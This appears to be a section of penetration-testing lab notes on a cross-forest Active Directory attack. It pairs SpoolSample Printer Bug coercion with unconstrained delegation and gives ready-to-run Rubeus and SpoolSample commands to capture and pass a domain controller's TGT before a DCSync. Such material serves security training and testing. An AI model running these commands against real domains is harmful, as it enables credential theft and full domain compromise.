# 14.17 Unconstrained Delegation Cross-Forest Printer Bug

> Cross-forest SpoolSample coercion against a target DC — works when TGT delegation is allowed and Selective Authentication is off.

## Overview

Identical technique to the intra-forest unconstrained delegation attack but applied cross-forest: from a DC with unconstrained delegation in <DOMAIN>.ad, coerce the logistics.ad DC to authenticate using SpoolSample (Printer Bug), capturing the DC02$ TGT. Prerequisites: two-way trust, TGT delegation allowed (default), Selective Authentication NOT enabled.

## Steps

- Run **Rubeus monitor /interval:5** on <DOMAIN> DC
- Run **SpoolSample dc02.logistics.ad dc01.<DOMAIN>.ad** to coerce logistics DC authentication
- Capture and renew the DC02$ TGT with **Rubeus renew /ptt**
- Execute DCSync against logistics.ad with the captured machine account TGT

## Commands

### Rubeus monitor

```powershell
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
```

### SpoolSample cross-forest

```powershell
PS C:\Tools> .\SpoolSample.exe dc02.logistics.ad dc01.<DOMAIN>.ad
```

### Rubeus renew captured ticket

```powershell
PS C:\Tools> .\Rubeus.exe renew /ticket:<SNIP> /ptt
```
